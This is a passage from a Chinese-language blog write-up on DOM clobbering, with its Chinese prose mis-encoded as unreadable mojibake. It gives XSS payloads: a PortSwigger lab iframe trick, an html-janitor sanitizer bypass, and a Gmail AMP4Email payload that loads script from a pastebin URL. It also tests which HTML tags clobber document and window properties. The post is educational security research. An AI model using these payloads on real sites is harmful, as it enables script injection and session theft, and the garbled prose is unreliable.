æ‰§è¡Œå®Œæˆæ‰ä¼šæœ‰è¯„è®ºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå»¶æ—¶æˆ–è€…é˜»å¡çš„æ“ä½œã€‚æ¯”è¾ƒç®€å•çš„æ˜¯åˆ©ç”¨iframeè¿›è¡ŒsetTimeout\n\u0026lt;iframe src=https://your-lab-id.web-security-academy.net/post?postId=3 onload=\u0026#34;setTimeout(a=\u0026gt;this.src=this.src+\u0026#39;#x\u0026#39;,500)\u0026#34;\u0026gt; è¿™é‡Œè¦æ³¨æ„ä¸€å®šè¦å¾—ç­‰è¯„è®ºåŠ è½½å®Œæ¯•å†ç”¨#xé€‰æ‹©formï¼Œæ‰€ä»¥è¿™é‡Œçš„ 500ms éœ€è¦æ ¹æ®è‡ªå·±çš„ç½‘ç»œæƒ…å†µé€‚å½“è°ƒæ•´ã€‚\n \nCVE-2017-0928 Bypassing sanitization using DOM clobbering html-janitor ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šæ–‡ç”¨åˆ°çš„ HTML filtersï¼Œåœ¨ v2.0.2 å½“ä¸­ï¼Œjanitor åœ¨å¾ªç¯ä¸­æœ‰è¿™ä¹ˆå‡ è¡Œä»£ç ï¼š\ndo { // Ignore nodes that have already been sanitized  if (node._sanitized) { continue; } //...  // Sanitize children  this._sanitize(node); // Mark node as sanitized so it\u0026#39;s ignored in future runs  node._sanitized = true; } while ((node = treeWalker.nextSibling())); ç”¨_sanitizedä½œä¸ºæ ‡å¿—ä½æ¥æ ‡å¿—æ˜¯å¦å·²ç»è¿›è¡Œæ ‡å‡†åŒ–ï¼Œä½†æ˜¯è¿™é‡Œï¼Œç”±æˆ‘ä»¬ä¸Šä¸ªä¾‹å­å¯ä»¥å¾—å‡ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸ä¸Šä¸ªä¾‹å­ç±»ä¼¼çš„ payload ç»•è¿‡ç¬¬ä¸€ä¸ª if å°±å¯ä»¥ç»•è¿‡æ ‡å‡†åŒ–è¿‡æ»¤äº†ã€‚\n\u0026lt;form\u0026gt;\u0026lt;object onmouseover=alert(document.domain) name=_sanitized\u0026gt;\u0026lt;/object\u0026gt;\u0026lt;/form\u0026gt; ä¿®å¤æ–¹æ¡ˆæ˜¯åˆ é™¤äº†è¿™äº›åˆ¤æ–­ï¼Œå¯¹å­æ ‘åˆ©ç”¨é€’å½’å½¢å¼è¿›è¡Œæ ‡å‡†åŒ–è¿‡æ»¤ã€‚\nXSS in GMailâ€™s AMP4Email via DOM Clobbering ç»ˆäºåˆ°äº†æˆ‘ä»¬å¼€å¤´æåˆ°çš„ OWASP Top 10 æåçš„æ”»å‡»å®ä¾‹äº†ï¼Œä½œè€…é¦–å…ˆé€šè¿‡ç›´æ¥åœ¨æ§åˆ¶å°è¾“å…¥ window è¿›è¡Œ fuzz\n \nè¿™é‡Œä»–é¦–å…ˆåˆ©ç”¨äº†AMPï¼Œå°è¯•æ’å…¥\u0026lt;a id=AMP\u0026gt;ï¼Œä½†æ˜¯è¿™ä¸ªAMPè¢« ban äº†\n \næ¥ç€æ‰¾åˆ°ä¸‹ä¸€ä¸ªAMP_MODEï¼Œè¿™ä¸ªæ²¡æœ‰è¢« ban ï¼Œåè€Œè®©ä½œè€…å‘ç°äº†è¿™é‡ŒåŠ è½½å¤±è´¥çš„ URL å½“ä¸­æœ‰ä¸€ä¸ªundefined\n \nè¿™å°±æ˜¯ä½œè€…æ’å…¥äº†\u0026lt;a id=AMP_MODE\u0026gt;å¯¼è‡´äº§ç”Ÿçš„undefinedï¼Œä¸»è¦äº§ç”Ÿè¿™ä¸ªé—®é¢˜çš„ä»£ç ç»ä½œè€…ç®€åŒ–åæ˜¯è¿™æ ·çš„ï¼š\nvar script = window.document.createElement(\u0026#34;script\u0026#34;); script.async = false; var loc; if (AMP_MODE.test \u0026amp;\u0026amp; window.testLocation) { loc = window.testLocation } else { loc = window.location; } if (AMP_MODE.localDev) { loc = loc.protocol + \u0026#34;//\u0026#34; + loc.host + \u0026#34;/dist\u0026#34; } else { loc = \u0026#34;https://cdn.ampproject.org\u0026#34;; } var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \u0026#34;/\u0026#34; : \u0026#34;\u0026#34;; b.src = loc + \u0026#34;/rtv/\u0026#34; + AMP_MODE.rtvVersion; + \u0026#34;/\u0026#34; + singlePass + \u0026#34;v0/\u0026#34; + pluginName + \u0026#34;.js\u0026#34;; document.head.appendChild(b); ä»£ç æ¯”è¾ƒç®€å•ï¼Œå¦‚æœå†è¦ç®€åŒ–åˆ°æ ¸å¿ƒä»£ç å°±æ˜¯ï¼š\nvar script = window.document.createElement(\u0026#34;script\u0026#34;); script.async = false; b.src = window.testLocation.protocol + \u0026#34;//\u0026#34; + window.testLocation.host + \u0026#34;/dist/rtv/\u0026#34; + AMP_MODE.rtvVersion; + \u0026#34;/\u0026#34; + (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \u0026#34;/\u0026#34; : \u0026#34;\u0026#34;) + \u0026#34;v0/\u0026#34; + pluginName + \u0026#34;.js\u0026#34;; document.head.appendChild(b); æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ Dom Clobbering æ¥è®©å®ƒåŠ è½½æˆ‘ä»¬ä»»æ„çš„ js æ–‡ä»¶ï¼Œç›´æ¥åŠ«æŒprotocolåˆ°æˆ‘ä»¬ä»»æ„ URLï¼Œå†åˆ©ç”¨#æ³¨é‡Šæ‰åé¢çš„å³å¯ã€‚\n\u0026lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--\u0026gt; \u0026lt;a id=\u0026#34;AMP_MODE\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a id=\u0026#34;AMP_MODE\u0026#34; name=\u0026#34;localDev\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a id=\u0026#34;AMP_MODE\u0026#34; name=\u0026#34;test\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;!-- window.testLocation.protocol is a base for the URL --\u0026gt; \u0026lt;a id=\u0026#34;testLocation\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a id=\u0026#34;testLocation\u0026#34; name=\u0026#34;protocol\u0026#34; href=\u0026#34;https://pastebin.com/raw/0tn8z0rG#\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; è™½ç„¶ URL æ„é€ å‡ºæ¥äº†ï¼Œä½†æ˜¯ Google è¿˜æœ‰ CSP\nContent-Security-Policy: default-src 'none'; script-src 'sha512-oQwIl...==' https://cdn.ampproject.org/rtv/ https://cdn.ampproject.org/v0.js https://cdn.ampproject.org/v0/ è™½ç„¶ä»–å½“æ—¶æ²¡ç»•è¿‡ï¼Œä½†æ˜¯ Google è¿˜æ˜¯å…¨é¢åœ°ç»™äº†ä»–å¥–é‡‘ã€‚\nå¦å¤–è¿™ä¸ª CSP å¯ä»¥åˆ©ç”¨..%252fçš„ trick è¿›è¡Œç»•è¿‡ï¼Œç”±äºä¸å±äºè¿™ç¯‡æ–‡ç« çš„èŒƒå›´ï¼Œè¿™é‡Œå°±ä¸è¯¦è¿°äº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯è‡ªè¡Œæœç´¢ã€‚\nè¿™é‡Œç”±äºç¯‡å¹…å…³ç³»ï¼Œå°±ä¸å†åˆ—ä¸¾æ›´å¤šçš„ä¾‹å­äº†ï¼Œæˆ‘ä¼šæŠŠæœ€è¿‘è‡ªå·±åšçš„ä¸€äº› XSS Game ä¸­æ¶‰åŠåˆ° Dom Clobbering çš„éƒ¨åˆ†ä»¥ Tip çš„å½¢å¼å†™å‡ºæ¥ã€‚\nThinking æ—¢ç„¶æˆ‘ä»¬ä¸€å¼€å§‹æåˆ°è¿‡æˆ–è®¸å¯ä»¥è¦†ç›–æŸäº›å±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥è¦†ç›–æˆ–è€…è¯´å®Œå…¨æ§åˆ¶document.cookieå‘¢ï¼Ÿç©¶ç«Ÿæˆ‘ä»¬å¯ä»¥è¦†ç›–å“ªäº›å‘¢ï¼Ÿåˆå¯ä»¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿå“ªäº›å¯ä»¥ç”¨ ID å“ªäº›ç”¨ Nameå‘¢ï¼Ÿ\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹æœ€åä¸€ä¸ªé—®é¢˜ï¼šå“ªäº›ç”¨ id å“ªäº›ç”¨ name ï¼Ÿ\nDocument \u0026amp; Id var html = [...];//HTML elements array var log = []; var div = document.createElement(\u0026#34;div\u0026#34;); for (var i = 0; i \u0026lt; html.length; i++) { div.innerHTML = \u0026#34;\u0026lt;\u0026#34; + html[i] + \u0026#34; id=x \u0026gt;\u0026#34;; document.body.appendChild(div); if (document.x == document.getElementById(\u0026#39;x\u0026#39;) \u0026amp;\u0026amp; document.x != undefined) { log.push(html[i]); } document.body.removeChild(div); } console.log(log); æˆ‘ä»¬å¯ä»¥å¾—åˆ°åªæœ‰objectæ ‡ç­¾documentå¯ä»¥é€šè¿‡ id è¿›è¡Œç›´æ¥è·å–\n[\u0026quot;object\u0026quot;] Document \u0026amp; Name document.x == document.getElementsByName(\u0026#34;x\u0026#34;)[0] \u0026amp;\u0026amp; document.x != undefined æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹äº”ä¸ªå…ƒç´ å¯ä»¥è®©documenté€šè¿‡ name è¿›è¡Œç›´æ¥è·å–\nÂ [\u0026quot;embed\u0026quot;, \u0026quot;form\u0026quot;, \u0026quot;image\u0026quot;, \u0026quot;img\u0026quot;, \u0026quot;object\u0026quot;] Document \u0026amp; Name \u0026amp; Id var html = [...];//HTML elements array var log = []; var div = document.createElement(\u0026#34;div\u0026#34;); for (var i = 0; i \u0026lt; html.length; i++) { div.innerHTML = \u0026#34;\u0026lt;\u0026#34; + html[i] + \u0026#34; id=x name=y \u0026gt;\u0026#34;; document.body.appendChild(div); if ( document.x == document.getElementsByName(\u0026#34;y\u0026#34;)[0] \u0026amp;\u0026amp; document.x != undefined ) { log.push(html[i]); } document.body.removeChild(div); } console.log(log); æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸‹ä¸‰ä¸ªå…ƒç´ ï¼š\n[\u0026quot;image\u0026quot;, \u0026quot;img\u0026quot;, \u0026quot;object\u0026quot;] Window \u0026amp; Id var html = [...];//HTML elements array var log = []; var div = document.createElement(\u0026#34;div\u0026#34;); for (var i = 0; i \u0026lt; html.length; i++) { div.innerHTML = \u0026#34;\u0026lt;\u0026#34; + html[i] + \u0026#34; id=x \u0026gt;\u0026#34;; document.body.appendChild(div); if (window.x == document.getElementById(\u0026#39;x\u0026#39;) \u0026amp;\u0026amp; window.x != undefined) { log.push(html[i]); } document.body.removeChild(div); } console.log(log); é™¤äº†åœ¨ [Not Clobbered](#Not Clobbered) éƒ¨åˆ†çš„æ ‡ç­¾ï¼Œå…¶ä»–æ ‡ç­¾windowå‡å¯é€šè¿‡ id è¿›è¡Œç›´æ¥è·å–\n(128) [\u0026quot;a\u0026quot;, \u0026quot;abbr\u0026quot;, \u0026quot;acronym\u0026quot;, \u0026quot;address\u0026quot;, \u0026quot;applet\u0026quot;, \u0026quot;area\u0026quot;, \u0026quot;article\u0026quot;, \u0026quot;aside\u0026quot;, \u0026quot;audio\u0026quot;, \u0026quot;b\u0026quot;, \u0026quot;base\u0026quot;, \u0026quot;basefont\u0026quot;, \u0026quot;bdi\u0026quot;, \u0026quot;bdo\u0026quot;, \u0026quot;bgsound\u0026quot;, \u0026quot;big\u0026quot;, \u0026quot;blink\u0026quot;, \u0026quot;blockquote\u0026quot;, \u0026quot;br\u0026quot;, \u0026quot;button\u0026quot;, \u0026quot;canvas\u0026quot;, \u0026quot;center\u0026quot;, \u0026quot;cite\u0026quot;, \u0026quot;code\u0026quot;, \u0026quot;command\u0026quot;, \u0026quot;content\u0026quot;, \u0026quot;data\u0026quot;, \u0026quot;datalist\u0026quot;, \u0026quot;dd\u0026quot;, \u0026quot;del\u0026quot;, \u0026quot;details\u0026quot;, \u0026quot;dfn\u0026quot;, \u0026quot;dialog\u0026quot;, \u0026quot;dir\u0026quot;, \u0026quot;div\u0026quot;, \u0026quot;dl\u0026quot;, \u0026quot;dt\u0026quot;, \u0026quot;element\u0026quot;, \u0026quot;em\u0026quot;, \u0026quot;embed\u0026quot;, \u0026quot;fieldset\u0026quot;, \u0026quot;figcaption\u0026quot;, \u0026quot;figure\u0026quot;, \u0026quot;font\u0026quot;, \u0026quot;footer\u0026quot;, \u0026quot;form\u0026quot;, \u0026quot;h1\u0026quot;, \u0026quot;header\u0026quot;, \u0026quot;hgroup\u0026quot;, \u0026quot;hr\u0026quot;, \u0026quot;i\u0026quot;, \u0026quot;iframe\u0026quot;, \u0026quot;iframes\u0026quot;, \u0026quot;image\u0026quot;, \u0026quot;img\u0026quot;, \u0026quot;input\u0026quot;, \u0026quot;ins\u0026quot;, \u0026quot;isindex\u0026quot;, \u0026quot;kbd\u0026quot;, \u0026quot;keygen\u0026quot;, \u0026quot;label\u0026quot;, \u0026quot;legend\u0026quot;, \u0026quot;li\u0026quot;, \u0026quot;link\u0026quot;, \u0026quot;listing\u0026quot;, \u0026quot;main\u0026quot;, \u0026quot;map\u0026quot;, \u0026quot;mark\u0026quot;, \u0026quot;marquee\u0026quot;, \u0026quot;menu\u0026quot;, \u0026quot;menuitem\u0026quot;, \u0026quot;meta\u0026quot;, \u0026quot;meter\u0026quot;, \u0026quot;multicol\u0026quot;, \u0026quot;nav\u0026quot;, \u0026quot;nextid\u0026quot;, \u0026quot;nobr\u0026quot;, \u0026quot;noembed\u0026quot;, \u0026quot;noframes\u0026quot;, \u0026quot;noscript\u0026quot;, \u0026quot;object\u0026quot;, \u0026quot;ol\u0026quot;, \u0026quot;optgroup\u0026quot;, \u0026quot;option\u0026quot;, \u0026quot;output\u0026quot;, \u0026quot;p\u0026quot;, \u0026quot;param\u0026quot;, \u0026quot;picture\u0026quot;, \u0026quot;plaintext\u0026quot;, \u0026quot;pre\u0026quot;, \u0026quot;progress\u0026quot;, \u0026quot;q\u0026quot;, \u0026quot;rb\u0026quot;, \u0026quot;rp\u0026quot;, \u0026quot;rt\u0026quot;, \u0026quot;rtc\u0026quot;, \u0026quot;ruby\u0026quot;, \u0026quot;s\u0026quot;, \u0026quot;samp\u0026quot;, \u0026quot;script\u0026quot;,Â â€¦] Window \u0026amp; Name window.x == document.getElementsByName(\u0026#34;x\u0026#34;)[0] \u0026amp;\u0026amp; window.x != undefined è¿™é‡Œä¸ document ä¸€è‡´ï¼Œåªæœ‰äº”ä¸ªæ ‡ç­¾å¯ä»¥è®©windowé€šè¿‡ name è¿›è¡Œç›´æ¥è·å–\nÂ [\u0026quot;embed\u0026quot;, \u0026quot;form\u0026quot;, \u0026quot;image\u0026quot;, \u0026quot;img\u0026quot;, \u0026quot;object\u0026quot;] \u0026lsquo;Not Clobbered\u0026rsquo; [\u0026quot;body\u0026quot;, \u0026quot;caption\u0026quot;, \u0026quot;col\u0026quot;, \u0026quot;colgroup\u0026quot;, \u0026quot;frame\u0026quot;, \u0026quot;frameset\u0026quot;, \u0026quot;head\u0026quot;, \u0026quot;html\u0026quot;, \u0026quot;tbody\u0026quot;, \u0026quot;td\u0026quot;, \u0026quot;tfoot\u0026quot;, \u0026quot;th\u0026quot;, \u0026quot;thead\u0026quot;, \u0026quot;tr\u0026quot;] PS: è¿™éƒ¨åˆ†å¹¶ä¸æ˜¯çœŸæ­£ä¸èƒ½ Clobbered ï¼Œå› ä¸ºæ¯”å¦‚è¯´bodyï¼Œå› ä¸ºæˆ‘æœ¬èº«ç•Œé¢å­˜åœ¨ä¸€ä¸ªbodyæ ‡ç­¾ï¼Œåªæ˜¯åœ¨æˆ‘æµ‹è¯•æ„å»ºçš„ç®€å•çš„ HTML é¡µé¢ä¸­ï¼Œè¿™äº›æ ‡ç­¾ä¸èƒ½è¢« Clobbered ï¼Œè€Œä¸”åœ¨å®é™…ä¸­ä¹Ÿç”¨åˆ°æ¯”è¾ƒå°‘ã€‚å¹¶ä¸”æ ¹æ® Chromium ä¸­çš„è¯´æ³•æ˜¯\u0026quot;but anything by id\u0026quot;ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦é€šè¿‡Window.idçš„å½¢å¼å»è·å–æ ‡ç­¾çš„è¯ï¼Œè¿˜æœ‰å¾ˆå¤šæ ‡ç­¾å¯ä»¥ä½¿ç”¨ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥å°½åŠ›å»æ„å»ºä¸‹æ–‡çš„è¦æ±‚ã€‚\nDom Doc å…¶å®åœ¨ Dom æ ‡å‡†ä¸­ä¹Ÿæœ‰æåŠè¿‡è¿™éƒ¨åˆ†ï¼Œåœ¨A part of Document interface è¿™ä¸€æ®µä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ç›¸å…³è§„å®šï¼š\n â€‹\tThe Document interface supports named properties. The supported property names of a Document object document at any moment consist of the following, in tree order according to the element that contributed them, ignoring later duplicates, and with values from id attributes coming before values from name attributes when the same element contributes both:\n the value of the name content attribute for all exposed embed, form, iframe, img, and exposed object elements that have a non-empty name content attribute and are in a document tree with document as their root; the value of the id content attribute for all exposed object elements that have a non-empty id content attribute and are in a document tree with document as their root; and the value of the id content attribute for all img elements that have both a non-empty id content attribute and a non-empty name content attribute, and are in a document tree with document as their root.   ä¹Ÿæœ‰å…³äºWindow å¯¹è±¡çš„éƒ¨åˆ†ï¼š\n â€‹\tThe Window object supports named properties. The supported property names of a Window object window at any moment consist of the following, in tree order according to the element that contributed them, ignoring later duplicates:\n window\u0026rsquo;s document-tree child browsing context name property set; the value of the name content attribute for all embed, form, img, and object elements that have a non-empty name content attribute and are in a document tree with window\u0026rsquo;s associated Document as their root; and the value of the id content attribute for all HTML elements that have a non-empty id content attribute and are in a document tree with window\u0026rsquo;s associated Document as their root.   Window å…³äº window å¯¹è±¡ï¼Œè™½ç„¶ window å¯¹è±¡å¯ä»¥é€šè¿‡ id ç›´æ¥è·å–æ ‡ç­¾ï¼Œä½†æ˜¯æˆ‘ç›®å‰è¿˜æ²¡å‘ç°å¯ä»¥ç›´æ¥é€šè¿‡æ ‡ç­¾ id è¿›è¡Œ clobber çš„å±æ€§ï¼Œæ¯•ç«Ÿæ˜¯åŸºäº Dom çš„æ”»å‡»æŠ€æœ¯ã€‚\nDocument è‡³äº Document å¯¹è±¡ï¼Œæˆ‘åˆ—ä¸¾äº†ä¸€ä¸‹ Document å¯¹è±¡ç‰¹æœ‰çš„å±æ€§ä»¥åŠå…¶å¯¹åº”çš„ç±»å‹ï¼š\n   Class Attr     DOMImplementation [\u0026ldquo;implementation\u0026rdquo;]   HTMLCollection [\u0026ldquo;images\u0026rdquo;, \u0026ldquo;embeds\u0026rdquo;, \u0026ldquo;plugins\u0026rdquo;, \u0026ldquo;links\u0026rdquo;, \u0026ldquo;forms\u0026rdquo;, \u0026ldquo;scripts\u0026rdquo;, \u0026ldquo;anchors\u0026rdquo;, \u0026ldquo;applets\u0026rdquo;, \u0026ldquo;children\u0026rdquo;]   String [\u0026ldquo;documentURI\u0026rdquo;, \u0026ldquo;compatMode\u0026rdquo;, \u0026ldquo;characterSet\u0026rdquo;, \u0026ldquo;charset\u0026rdquo;, \u0026ldquo;inputEncoding\u0026rdquo;, \u0026ldquo;contentType\u0026rdquo;, \u0026ldquo;domain\u0026rdquo;, \u0026ldquo;referrer\u0026rdquo;, \u0026ldquo;cookie\u0026rdquo;, \u0026ldquo;lastModified\u0026rdquo;, \u0026ldquo;readyState\u0026rdquo;, \u0026ldquo;title\u0026rdquo;, \u0026ldquo;dir\u0026rdquo;, \u0026ldquo;designMode\u0026rdquo;, \u0026ldquo;fgColor\u0026rdquo;, \u0026ldquo;linkColor\u0026rdquo;, \u0026ldquo;vlinkColor\u0026rdquo;, \u0026ldquo;alinkColor\u0026rdquo;, \u0026ldquo;bgColor\u0026rdquo;, \u0026ldquo;visibilityState\u0026rdquo;, \u0026ldquo;webkitVisibilityState\u0026rdquo;, \u0026ldquo;nodeName\u0026rdquo;, \u0026ldquo;baseURI\u0026rdquo;]   HTMLBodyElement [\u0026ldquo;body\u0026rdquo;, \u0026ldquo;activeElement\u0026rdquo;]   HTMLHeadElement [\u0026ldquo;head\u0026rdquo;]   HTMLScriptElement [\u0026ldquo;currentScript\u0026rdquo;]   HTMLAllCollection [\u0026ldquo;all\u0026rdquo;]   NodeList [\u0026ldquo;childNodes\u0026rdquo;]   Window [\u0026ldquo;defaultView\u0026rdquo;]   DocumentType [\u0026ldquo;doctype\u0026rdquo;, \u0026ldquo;firstChild\u0026rdquo;]   Boolean [\u0026ldquo;xmlStandalone\u0026rdquo;, \u0026ldquo;hidden\u0026rdquo;, \u0026ldquo;wasDiscarded\u0026rdquo;, \u0026ldquo;webkitHidden\u0026rdquo;, \u0026ldquo;fullscreenEnabled\u0026rdquo;, \u0026ldquo;fullscreen\u0026rdquo;, \u0026ldquo;webkitIsFullScreen\u0026rdquo;, \u0026ldquo;webkitFullscreenEnabled\u0026rdquo;, \u0026ldquo;pictureInPictureEnabled\u0026rdquo;, \u0026ldquo;isConnected\u0026rdquo;]   FontFaceSet [\u0026ldquo;fonts\u0026rdquo;]   StyleSheetList [\u0026ldquo;styleSheets\u0026rdquo;]   Function [\u0026ldquo;getElementsByTagName\u0026rdquo;, \u0026ldquo;getElementsByTagNameNS\u0026rdquo;, \u0026ldquo;getElementsByClassName\u0026rdquo;, \u0026ldquo;createDocumentFragment\u0026rdquo;, \u0026ldquo;createTextNode\u0026rdquo;, \u0026ldquo;createCDATASection\u0026rdquo;, \u0026ldquo;createComment\u0026rdquo;, \u0026ldquo;createProcessingInstruction\u0026rdquo;, \u0026ldquo;importNode\u0026rdquo;, \u0026ldquo;adoptNode\u0026rdquo;, \u0026ldquo;createAttribute\u0026rdquo;, \u0026ldquo;createAttributeNS\u0026rdquo;, \u0026ldquo;createEvent\u0026rdquo;, \u0026ldquo;createRange\u0026rdquo;, \u0026ldquo;createNodeIterator\u0026rdquo;, \u0026ldquo;createTreeWalker\u0026rdquo;, \u0026ldquo;getElementsByName\u0026rdquo;, \u0026ldquo;write\u0026rdquo;, \u0026ldquo;writeln\u0026rdquo;, \u0026ldquo;hasFocus\u0026rdquo;, \u0026ldquo;execCommand\u0026rdquo;, \u0026ldquo;queryCommandEnabled\u0026rdquo;, \u0026ldquo;queryCommandIndeterm\u0026rdquo;, \u0026ldquo;queryCommandState\u0026rdquo;, \u0026ldquo;queryCommandSupported\u0026rdquo;, \u0026ldquo;queryCommandValue\u0026rdquo;, \u0026ldquo;clear\u0026rdquo;, \u0026ldquo;exitPointerLock\u0026rdquo;, \u0026ldquo;createElement\u0026rdquo;, \u0026ldquo;createElementNS\u0026rdquo;, \u0026ldquo;caretRangeFromPoint\u0026rdquo;, \u0026ldquo;elementFromPoint\u0026rdquo;, \u0026ldquo;elementsFromPoint\u0026rdquo;, \u0026ldquo;getElementById\u0026rdquo;, \u0026ldquo;prepend\u0026rdquo;, \u0026ldquo;append\u0026rdquo;, \u0026ldquo;querySelector\u0026rdquo;, \u0026ldquo;querySelectorAll\u0026rdquo;, \u0026ldquo;exitFullscreen\u0026rdquo;, \u0026ldquo;webkitCancelFullScreen\u0026rdquo;, \u0026ldquo;webkitExitFullscreen\u0026rdquo;, \u0026ldquo;createExpression\u0026rdquo;, \u0026ldquo;createNSResolver\u0026rdquo;, \u0026ldquo;evaluate\u0026rdquo;, \u0026ldquo;registerElement\u0026rdquo;, \u0026ldquo;exitPictureInPicture\u0026rdquo;, \u0026ldquo;hasChildNodes\u0026rdquo;, \u0026ldquo;getRootNode\u0026rdquo;, \u0026ldquo;normalize\u0026rdquo;, \u0026ldquo;cloneNode\u0026rdquo;, \u0026ldquo;isEqualNode\u0026rdquo;, \u0026ldquo;isSameNode\u0026rdquo;, \u0026ldquo;compareDocumentPosition\u0026rdquo;, \u0026ldquo;contains\u0026rdquo;, \u0026ldquo;lookupPrefix\u0026rdquo;, \u0026ldquo;lookupNamespaceURI\u0026rdquo;, \u0026ldquo;isDefaultNamespace\u0026rdquo;, \u0026ldquo;insertBefore\u0026rdquo;, \u0026ldquo;appendChild\u0026rdquo;, \u0026ldquo;replaceChild\u0026rdquo;, \u0026ldquo;removeChild\u0026rdquo;]   NodeList [\u0026ldquo;childNodes\u0026rdquo;]   Array [\u0026ldquo;adoptedStyleSheets\u0026rdquo;]   FeaturePolicy [\u0026ldquo;featurePolicy\u0026rdquo;]   Null [\u0026ldquo;xmlEncoding\u0026rdquo;, \u0026ldquo;xmlVersion\u0026rdquo;, \u0026ldquo;onreadystatechange\u0026rdquo;, \u0026ldquo;onpointerlockchange\u0026rdquo;, \u0026ldquo;onpointerlockerror\u0026rdquo;, \u0026ldquo;onbeforecopy\u0026rdquo;, \u0026ldquo;onbeforecut\u0026rdquo;, \u0026ldquo;onbeforepaste\u0026rdquo;, \u0026ldquo;onfreeze\u0026rdquo;, \u0026ldquo;onresume\u0026rdquo;, \u0026ldquo;onsecuritypolicyviolation\u0026rdquo;, \u0026ldquo;onvisibilitychange\u0026rdquo;, \u0026ldquo;oncopy\u0026rdquo;, \u0026ldquo;oncut\u0026rdquo;, \u0026ldquo;onpaste\u0026rdquo;, \u0026ldquo;pointerLockElement\u0026rdquo;, \u0026ldquo;fullscreenElement\u0026rdquo;, \u0026ldquo;onfullscreenchange\u0026rdquo;, \u0026ldquo;onfullscreenerror\u0026rdquo;, \u0026ldquo;webkitCurrentFullScreenElement\u0026rdquo;, \u0026ldquo;webkitFullscreenElement\u0026rdquo;, \u0026ldquo;onwebkitfullscreenchange\u0026rdquo;, \u0026ldquo;onwebkitfullscreenerror\u0026rdquo;, \u0026ldquo;rootElement\u0026rdquo;, \u0026ldquo;pictureInPictureElement\u0026rdquo;, \u0026ldquo;ownerDocument\u0026rdquo;, \u0026ldquo;parentNode\u0026rdquo;, \u0026ldquo;parentElement\u0026rdquo;, \u0026ldquo;previousSibling\u0026rdquo;, \u0026ldquo;nextSibling\u0026rdquo;, \u0026ldquo;nodeValue\u0026rdquo;, \u0026ldquo;textContent\u0026rdquo;]    å…¶ä¸­ï¼ŒHTMLBodyElement/HTMLHeadElement/HTMLScriptElement å‡ç»§æ‰¿è‡ªHTMLElementï¼Œä¸ºä»€ä¹ˆéœ€è¦è¿™äº›å‘¢ï¼Ÿå› ä¸ºåœ¨å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ Clobber å¾—åˆ°çš„å°±æ˜¯ä¸€ä¸ªHTMLElementï¼Œè€Œ Document æŸäº›å±æ€§å¾—åˆ°çš„ä¹Ÿæ˜¯ä¸€ä¸ªHTMLElementï¼Œæ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚\nCause æˆ‘æƒ³å¦‚æœèƒ½è¦†ç›–çš„è¯ï¼Œåº”è¯¥å°±æ˜¯åœ¨è°ƒç”¨document.xçš„æ—¶å€™ï¼Œ Dom æ ‘è§£æå¾—åˆ°çš„ç»“æœè¦ä¼˜å…ˆäºdocumentè‡ªå·±æœ¬èº«å±æ€§ï¼Œæ‰€ä»¥äº§ç”Ÿäº†è¿™æ ·çš„ç»“æœï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨è¦†ç›–cookieçš„æ—¶å€™å´ä¸èƒ½å®Œå…¨æ§åˆ¶è¦†ç›–å‘¢ï¼Ÿ\nå¸¦ç€è¿™äº›ç–‘é—®ï¼Œæˆ‘ç‰¹åœ°å»çœ‹äº†ä¸€ä¼š chromium çš„æºç ï¼Œç®€ç•¥åœ°çœ‹äº†ä¸€ä¸‹è¿™äº›å®ç°ï¼Œä¸»è¦åœ¨ chromium çš„ blink éƒ¨åˆ†ã€‚ç”±äºè‡ªå·±çŸ¥è¯†æµ…è–„ï¼Œå¹¶æ²¡æœ‰å®Œæ•´åœ°é˜…è¯»è¿‡ chromium æºç ï¼Œè¿™é‡Œè¿˜å¯èƒ½è®¾è®¡åˆ°ä¸€äº›ç¼–è¯‘åŸç†çš„çŸ¥è¯†ï¼Œæ‰€ä»¥æˆ‘å¹¶æ²¡æœ‰å®‰å…¨æŠŠæ•´ä¸ª Chromium äº§ç”Ÿè¿™ä¸ªé—®é¢˜çš„ç¼˜ç”±ä»¥ä»£ç è¿½è¸ªçš„å½¢å¼å¼„å‡ºæ¥ï¼Œå¦‚æœè¦å¼„çš„è¯ä¼°è®¡ä¹Ÿå¾—å» debug Chromium ï¼Œé‚£å°±æ˜¯å¦ä¸€ç¯‡æ–‡ç« çš„å†…å®¹äº†ï¼Œæ‰€ä»¥è¿™ä¸ªéƒ¨åˆ†è¿˜æœ‰å¾…ç»§ç»­ç ”ç©¶ï¼Œä¸è¿‡æˆ‘æŠŠè‡ªå·±çœ‹çš„ä¸€äº›æœ‰ç”¨çš„éƒ¨åˆ†å†™å‡ºæ¥ã€‚å¦‚æœæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥è”ç³»æˆ‘ä¸€èµ·ç ”ç©¶çœ‹çœ‹ã€‚ï¼ˆè™½ç„¶æˆ‘å¾ˆèœXD\nå…¨éƒ¨ä»£ç æ¥æºäº Chomiunm Code 